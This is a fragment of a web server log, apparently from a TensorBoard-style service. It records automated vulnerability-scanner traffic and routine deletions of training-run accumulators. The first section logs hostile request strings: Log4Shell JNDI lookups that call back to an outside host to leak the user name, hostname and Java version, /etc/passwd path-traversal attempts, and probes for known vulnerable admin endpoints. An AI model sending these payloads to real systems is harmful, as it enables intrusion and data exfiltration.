+W0615 07:21:56.358782 140431069280000 application.py:559] path /app/rest/users/id:1/tokens/RPC2 not found, sending 404
+W0615 07:21:56.442695 140431069280000 application.py:559] path /app/rest/users/id:1/tokens/RPC2 not found, sending 404
+W0615 07:21:56.617943 140431303976704 application.py:559] path /%24%7Bj%24%7Bk8s%3Ak5%3A-ND%7Di%3Aldap%3A%2F%2F%24%7Bsys%3Auser.name%7D.log4j04567902a986c53f7498e687978071c5.hacked.bdsec.top%2Fxxx%7D not found, sending 404
+E0615 07:21:56.638161 140431069280000 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:21:56] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+E0615 07:21:56.936286 140431069280000 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:21:56] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0615 07:21:56.943378 140431303976704 application.py:559] path /run not found, sending 404
+W0615 07:21:57.140472 140431303976704 application.py:559] path /${jndi:rmi://${hostName}.log4j.${java:version}.log4j04567902a986c53f7498e687978071c5.hacked.bdsec.top/em4fmk} not found, sending 404
+W0615 07:21:57.645499 140431303976704 application.py:559] path /%24%7Bjndi%3Armi%3A%2F%2F%24%7BhostName%7D.log4j.%24%7Bjava%3Aversion%7D.log4j04567902a986c53f7498e687978071c5.hacked.bdsec.top%2Fem4fmk%7D not found, sending 404
+E0615 07:21:58.205081 140431303976704 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:21:58] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+E0615 07:21:58.313789 140431303976704 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:21:58] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0615 07:22:00.942377 140431303976704 application.py:559] path /../../../../../etc/passwd not found, sending 404
+W0615 07:22:01.016085 140431303976704 application.py:559] path /solr not found, sending 404
+W0615 07:22:01.043833 140431303976704 application.py:559] path /.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd not found, sending 404
+E0615 07:22:01.106374 140431069280000 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:22:01] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0615 07:22:01.142241 140431069280000 application.py:559] path /icons/../../../../../etc/passwd not found, sending 404
+W0615 07:22:01.234381 140431069280000 application.py:559] path /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd not found, sending 404
+E0615 07:22:01.336031 140431069280000 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:22:01] code 400, message Bad request syntax ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03')
+E0615 07:22:01.423964 140431069280000 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:22:01] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+E0615 07:22:01.452261 140431069280000 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:22:01] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+E0615 07:22:01.537067 140431069280000 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:22:01] code 400, message Bad request version ('j\x8c')
+W0615 07:22:01.847191 140431069280000 application.py:559] path /xxl-job-admin/login not found, sending 404
+E0615 07:22:01.944511 140431069280000 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:22:01] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0615 07:22:02.043598 140431303976704 application.py:559] path /run not found, sending 404
+W0615 07:22:03.015077 140431303976704 application.py:559] path /druid/indexer/v1/sampler not found, sending 404
+E0615 07:22:03.303817 140431303976704 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:22:03] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0615 07:22:04.843460 140431303976704 application.py:559] path /api/v1/cluster/summary not found, sending 404
+E0615 07:22:05.025662 140431303976704 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:22:05] code 400, message Bad request version ('Ôuw\x9c¾\x9fewþ\\\x90\x13OÆm»\x9cuL3\x82{\x1a\x99')
+E0615 07:22:05.921922 140431303976704 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:22:05] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0615 07:22:10.060749 140431303976704 application.py:559] path /login not found, sending 404
+E0615 07:22:10.214242 140431303976704 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:22:10] code 400, message Bad request version ('¹PÅ^Gê÷/IÍd')
+W0615 07:22:15.336187 140431303976704 application.py:559] path /terminals/3 not found, sending 404
+E0615 07:22:15.504700 140431303976704 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:22:15] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03isÃªe\x11Ï9\x84¡t\x8d¦e')
+E0615 07:22:16.428172 140431069280000 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:22:16] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0615 07:22:17.736635 140431069280000 application.py:559] path /j_acegi_security_check not found, sending 404
+E0615 07:22:18.004713 140431069280000 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:22:18] code 400, message Bad request syntax ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03Ûs#o+fÎh£_õÖ\x90\x1d')
+W0615 07:22:18.128762 140431069280000 application.py:559] path /j_spring_security_check not found, sending 404
+E0615 07:22:18.226472 140431069280000 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:22:18] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0615 07:22:21.827009 140431303976704 application.py:559] path /api/v1/users/admin not found, sending 404
+E0615 07:22:22.014045 140431303976704 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:22:22] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+E0615 07:22:24.312954 140431069280000 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:22:24] code 400, message Bad request syntax ('\x00\x00\x00d\x00\x00\x00`{"code":26,"flag":0,"language":"JAVA","opaque":0,"serializeTypeCurrentRPC":"JSON","version":395}')
+E0615 07:22:29.313500 140431069280000 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:22:29] code 400, message Bad request syntax ("\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03¦n³\x92#'/æQÂ")
+E0615 07:22:29.628473 140431069280000 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:22:29] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0615 07:22:29.931770 140431069280000 application.py:559] path /es not found, sending 404
+E0615 07:22:30.337025 140431069280000 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:22:30] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0615 07:22:30.380511 140431069280000 application.py:559] path /setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp not found, sending 404
+W0615 07:22:30.426938 140431069280000 application.py:559] path /elasticsearch not found, sending 404
+W0615 07:22:30.531911 140431069280000 application.py:559] path /nacos/v1/core/cluster/nodes not found, sending 404
+W0615 07:22:30.553598 140431069280000 application.py:559] path /v1/agent/members not found, sending 404
+E0615 07:22:30.555405 140431303976704 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:22:30] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+E0615 07:22:30.733683 140431069280000 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:22:30] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+E0615 07:22:30.804832 140431303976704 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:22:30] code 400, message Bad request version ('[\x90å\x96£X')
+W0615 07:22:30.850425 140431048300288 application.py:559] path /es/elasticsearch not found, sending 404
+E0615 07:22:31.114188 140431048300288 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:22:31] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0615 07:22:31.342083 140431048300288 application.py:559] path /elastic not found, sending 404
+E0615 07:22:31.513537 140431048300288 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:22:31] code 400, message Bad request syntax ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03wDÕe\x15\x0eCy\x19\x01¸_àÑ}éÐ')
+W0615 07:22:31.624083 140431048300288 application.py:559] path /search not found, sending 404
+E0615 07:22:31.743427 140431048300288 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:22:31] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0616 11:36:20.227133 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun06_15-55-57_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0616 11:36:20.227414 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun06_16-13-04_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0616 12:28:15.452908 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun16_12-20-23_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_contrastive_lerning_cnn_bert'
+W0616 14:46:41.670422 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun16_14-28-30_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0616 14:46:41.670798 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun16_14-32-21_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0616 14:46:41.670868 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun16_14-36-22_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0616 14:46:46.671731 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun16_14-39-00_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0616 15:04:11.850998 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun16_14-47-08_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0616 18:30:23.882369 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun16_15-04-39_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0616 18:31:18.890837 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun16_18-31-07_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0616 18:34:23.917014 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun16_18-32-08_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0616 18:36:58.941595 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun16_18-34-39_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0616 18:57:49.155048 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun16_18-54-53_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_contrastive_lerning_cnn_bert'
+W0616 19:01:09.195353 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun16_18-57-12_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_contrastive_lerning_cnn_bert'
+W0616 19:06:24.278259 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun16_19-04-01_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0616 19:06:24.278534 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun16_19-01-22_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0616 19:52:39.967756 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun16_18-37-12_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0616 19:52:39.968079 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun16_18-47-52_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0616 21:20:01.088607 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun16_19-52-24_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0616 21:20:01.088920 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun16_19-06-38_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0616 22:10:41.657264 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun16_22-02-49_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0617 21:48:09.853371 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun16_21-19-41_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0617 21:48:09.853818 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun16_12-26-17_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_contrastive_lerning_cnn_bert'
+W0617 22:13:15.060977 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun17_22-07-48_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_contrastive_lerning_cnn_bert'
+W0617 22:31:50.242889 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun17_22-13-41_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_contrastive_lerning_cnn_bert'
+W0617 22:44:20.359779 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun17_22-32-33_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_contrastive_lerning_cnn_bert'
+W0617 23:41:55.969100 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun17_22-44-38_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_contrastive_lerning_cnn_bert'
+W0618 11:42:04.014649 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun18_11-37-48_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0618 12:37:34.916534 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun18_11-42-40_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0618 16:33:04.071429 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun18_10-44-18_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0618 16:33:04.071836 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun18_08-18-51_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0618 17:24:19.856352 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun18_16-34-00_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_contrastive_lerning_cnn_bert'
+W0618 18:12:00.605157 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun18_17-24-46_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_contrastive_lerning_cnn_bert'
+W0618 21:08:08.202220 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun18_18-12-32_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_contrastive_lerning_cnn_bert'
+W0618 21:36:23.622994 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun18_21-06-32_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_contrastive_lerning_cnn_bert'
+W0618 22:42:04.605390 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun18_22-39-29_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0618 22:48:19.709474 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun18_22-42-21_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0618 22:56:19.848469 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun18_21-35-23_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_contrastive_lerning_cnn_bert'
+W0618 23:06:30.031945 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun18_22-56-29_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0619 13:45:55.778910 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun17_23-42-41_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_contrastive_lerning_cnn_bert'
+W0619 13:46:00.780204 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun18_12-42-01_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0619 13:46:00.780391 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun18_22-48-20_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0619 13:46:00.780444 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun18_23-05-44_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0619 13:57:45.897637 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun19_13-55-07_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0619 13:58:25.904421 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun19_13-57-05_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0619 15:19:27.008745 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun19_14-17-23_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0619 18:29:29.553986 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun19_18-28-28_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0619 22:24:12.973578 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun19_18-30-02_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0620 13:30:02.264234 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun20_13-01-33_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0620 14:21:28.285404 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun20_13-31-34_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+E0623 15:34:16.708148 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:34:16] code 400, message Bad request version ('RTSP/1.0')
+E0623 15:34:21.760856 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:34:21] code 400, message Bad request version ('\x00\x01\x97|\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
+E0623 15:34:26.780030 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:34:26] code 400, message Bad HTTP/0.9 request type ('\x00')
+E0623 15:34:31.800993 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:34:31] code 400, message Bad HTTP/0.9 request type ('\x00')
+E0623 15:34:31.831176 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:34:31] code 400, message Bad request syntax ('HELP')
+E0623 15:34:31.881764 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:34:31] code 400, message Bad request syntax ('\x16\x03\x00\x00S\x01\x00\x00O\x03\x00?G×÷º,îê²`~ó\x00ý\x82{¹Õ\x96Èw\x9bæÄÛ<=Ûoï\x10n\x00\x00(\x00\x16\x00\x13\x00')
+E0623 15:34:31.943348 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:34:31] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
+E0623 15:34:31.996643 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:34:31] code 400, message Bad request version ('\x00/\x00')
+E0623 15:34:32.049550 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:34:32] code 400, message Bad request syntax ('\x00\x00\x00qj\x81n0\x81k¡\x03\x02\x01\x05¢\x03\x02\x01')
+E0623 15:34:37.096245 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:34:37] code 400, message Bad request version ('0.12\x00')
+E0623 15:34:42.117950 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:34:42] code 400, message Bad HTTP/0.9 request type ('l\x00')
+W0623 15:34:42.148046 140431048300288 application.py:559] path /nice ports,/Trinity.txt.bak not found, sending 404
+E0623 15:34:42.212676 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:34:42] code 400, message Bad request syntax ('\x01default')
+E0623 15:34:42.263593 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:34:42] code 400, message Bad request syntax ('0\x84\x00\x00\x00-\x02\x01\x07c\x84\x00\x00\x00$\x04\x00')
+E0623 15:34:47.309412 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:34:47] code 400, message Bad HTTP/0.9 request type ('0')
+E0623 15:34:47.333165 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:34:47] code 400, message Bad request version ('SIP/2.0')
+E0623 15:34:52.379294 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:34:52] code 400, message Bad request syntax ('TNMP\x04\x00\x00\x00TNME\x00\x00\x04\x00')
+E0623 15:34:57.405673 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:34:57] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00')
+E0623 15:35:02.426680 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:35:02] code 400, message Bad request syntax ('DmdT\x00\x00\x00\x17\x00\x00\x00\x01\x00\x00\x00\x00\x11\x11\x00ÿ\x01ÿ\x13')
+E0623 15:35:07.448406 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:35:07] code 400, message Bad HTTP/0.9 request type (':\x00\x00\x00/\x00\x00\x00\x02\x00\x00@\x02\x0f\x00\x01\x00=\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/\x00\x00\x00\x00\x00\x00\x00\x00\x00@')
+E0623 15:35:12.477750 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:35:12] code 400, message Bad request syntax ('JRMI\x00\x02K')
+E0623 15:35:17.498172 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:35:17] code 400, message Bad request version ('\x00{\x000\x000\x000\x000\x00A\x00A\x000\x000\x00-\x000\x00A\x000\x000\x00-\x000\x000\x00a\x000\x00-\x00A\x00A\x000\x00A\x00-\x000\x000\x000\x000\x00A\x000\x00A\x00A\x000\x00A\x00A\x000\x00}\x00\x00\x00àmß_')
+E0623 15:35:22.518743 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:35:22] code 400, message Bad HTTP/0.9 request type ('\x00Z\x00\x00\x01\x00\x00\x00\x016\x01,\x00\x00\x08\x00\x7fÿ\x7f\x08\x00\x00\x00\x01\x00')
+E0623 15:35:27.540827 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:35:27] code 400, message Bad request version ('\x03\x00(\x00\x04ÿ\x08\x00\x01U\x00\x00\x00MSSQLServer\x00H\x0f\x00\x00')
+E0623 15:35:32.562571 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:35:32] code 400, message Bad request syntax ('\x00\x03\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x0f\x00')
+E0623 15:35:37.585890 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:35:37] code 400, message Bad request syntax ('GIOP\x01\x00\x01\x00$\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00abcdef\x00\x00\x04\x00\x00\x00get\x00\x00\x00\x00\x00')
+E0623 15:35:37.606295 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:35:37] code 400, message Bad request syntax ('\x00\x00\x00É\x00\x00\x00±{"code":25,"extFields":{"AccessKey":"rocketmq2","Signature":"+zdRdUuaziSQkHUUqdrtwg1F8jk="},"flag":0,"language":"JAVA","opaque":0,"serializeTypeCurrentRPC":"JSON","version":433}test_key=test_value')
+E0623 15:35:37.657727 140431048300288 _internal.py:96] 10.94.17.35 - - [23/Jun/2024 15:35:37] code 400, message Bad request syntax ('\x00\x00\x00É\x00\x00\x00±{"code":25,"extFields":{"AccessKey":"rocketmq2","Signature":"+zdRdUuaziSQkHUUqdrtwg1F8jk="},"flag":0,"language":"JAVA","opaque":0,"serializeTypeCurrentRPC":"JSON","version":433}test_key=test_value')
+E0623 15:43:56.296306 140431048300288 _internal.py:96] 10.14.117.25 - - [23/Jun/2024 15:43:56] code 400, message Bad request version ('À\x13À')
+E0623 18:18:54.681416 140431048300288 _internal.py:96] 10.21.146.68 - - [23/Jun/2024 18:18:54] code 400, message Bad request version ('À\x13À')
+E0623 21:12:03.290868 140431048300288 _internal.py:96] 10.21.146.68 - - [23/Jun/2024 21:12:03] code 400, message Bad request version ('À\x13À')
+E0624 00:11:47.029289 140431048300288 _internal.py:96] 10.21.146.73 - - [24/Jun/2024 00:11:47] code 400, message Bad request version ('À\x13À')
+E0624 03:11:19.360077 140431048300288 _internal.py:96] 10.14.117.25 - - [24/Jun/2024 03:11:19] code 400, message Bad request version ('À\x13À')
+E0624 06:06:15.101967 140431048300288 _internal.py:96] 10.14.117.25 - - [24/Jun/2024 06:06:15] code 400, message Bad request version ('À\x13À')
+E0624 08:59:54.268262 140431048300288 _internal.py:96] 10.14.117.25 - - [24/Jun/2024 08:59:54] code 400, message Bad request version ('À\x13À')
+E0624 11:59:38.073340 140431048300288 _internal.py:96] 10.21.146.68 - - [24/Jun/2024 11:59:38] code 400, message Bad request version ('®ãl6\x02oø´ß\x10UÌ^uJ')
+E0624 14:58:41.381182 140431048300288 _internal.py:96] 10.21.146.68 - - [24/Jun/2024 14:58:41] code 400, message Bad request version ('À\x13À')
+E0624 17:56:14.075707 140431048300288 _internal.py:96] 10.21.146.68 - - [24/Jun/2024 17:56:14] code 400, message Bad request version ('À\x13À')
+E0624 20:52:33.636628 140431048300288 _internal.py:96] 10.21.146.68 - - [24/Jun/2024 20:52:33] code 400, message Bad request version ('À\x13À')
+E0624 23:51:15.972738 140431048300288 _internal.py:96] 10.21.146.73 - - [24/Jun/2024 23:51:15] code 400, message Bad request syntax ('\x16\x03\x01\x00ü\x01\x00\x00ø\x03\x03\x93\xad')
+E0625 02:51:14.922662 140431048300288 _internal.py:96] 10.14.117.25 - - [25/Jun/2024 02:51:14] code 400, message Bad request version ('À\x13À')
+E0625 05:48:20.241063 140431048300288 _internal.py:96] 10.21.146.73 - - [25/Jun/2024 05:48:20] code 400, message Bad request version ('À\x13À')
+E0625 08:44:41.577480 140431048300288 _internal.py:96] 10.14.117.25 - - [25/Jun/2024 08:44:41] code 400, message Bad request version ('À\x13À')
+E0625 11:43:07.646233 140431048300288 _internal.py:96] 10.21.146.68 - - [25/Jun/2024 11:43:07] code 400, message Bad request version ('À\x13À')
+W0625 13:55:37.179137 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun25_12-49-51_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0625 13:55:37.179396 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun25_12-40-55_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0625 13:55:42.181898 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun25_13-00-47_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0625 13:55:42.182132 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun25_13-24-46_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0625 13:56:17.195575 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun25_13-56-08_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+E0625 14:42:11.601713 140431069280000 _internal.py:96] 10.14.117.25 - - [25/Jun/2024 14:42:11] code 400, message Bad request version ('À\x13À')
+E0625 17:39:06.568317 140431069280000 _internal.py:96] 10.21.146.68 - - [25/Jun/2024 17:39:06] code 400, message Bad request version ('À\x13À')
+E0625 20:34:54.579558 140431069280000 _internal.py:96] 10.21.146.68 - - [25/Jun/2024 20:34:54] code 400, message Bad request version ('À\x13À')
+E0625 23:08:16.522628 140431016830720 _internal.py:96] 10.21.146.68 - - [25/Jun/2024 23:08:16] code 400, message Bad request version ('À\x13À')
+E0626 02:07:35.175557 140431048300288 _internal.py:96] 10.21.146.73 - - [26/Jun/2024 02:07:35] code 400, message Bad request syntax ('\x16\x03\x01\x00ü\x01\x00\x00ø\x03\x03\x15aÄ¸\x14flé¬É\x00¯îe/4à}?ò¶Os')
+E0626 05:07:27.426615 140431048300288 _internal.py:96] 10.14.117.25 - - [26/Jun/2024 05:07:27] code 400, message Bad request version ('À\x13À')
+E0626 08:02:07.680291 140431048300288 _internal.py:96] 10.14.117.25 - - [26/Jun/2024 08:02:07] code 400, message Bad request version ('À\x13À')
